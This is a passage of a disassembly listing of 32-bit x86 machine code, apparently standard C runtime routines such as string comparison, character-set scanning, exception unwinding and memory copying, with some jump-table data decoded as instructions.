  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
